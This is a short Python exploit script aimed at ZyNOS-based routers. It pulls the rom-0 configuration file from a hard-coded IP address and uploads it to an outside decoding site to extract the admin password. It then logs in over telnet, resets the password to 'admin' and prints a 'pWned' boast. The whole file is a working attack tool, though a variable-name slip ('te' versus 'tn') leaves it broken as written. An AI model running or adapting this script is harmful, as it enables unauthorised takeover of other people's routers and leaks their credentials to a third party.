from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from netaddr import IPNetwork
import urllib2
import urllib
import re
import getpass
import sys
import telnetlib
import time
import os
import socket
import sys
socket.setdefaulttimeout(4)

host='125.27.139.142'  #change the ipadress here 

urllib.urlretrieve ("http://"+host+"/rom-0", "rom-0")
datagen, headers = multipart_encode({"uploadedfile": open("rom-0")})

request = urllib2.Request("http://198.61.167.113/zynos/decoded.php", datagen, headers)

str_1 = urllib2.urlopen(request).read()

m = re.search('rows=10>(.*)', str_1)
if m:
        found = m.group(1)  

te=telnetlib.Telnet(host, 23, 3)
te.read_until("Password: ")
tn.write(found + "\n") 
tn.write("sys password admin\n")
print ("DAFAQ !Success and pWned :Pi") 
tn.write("exit\n")





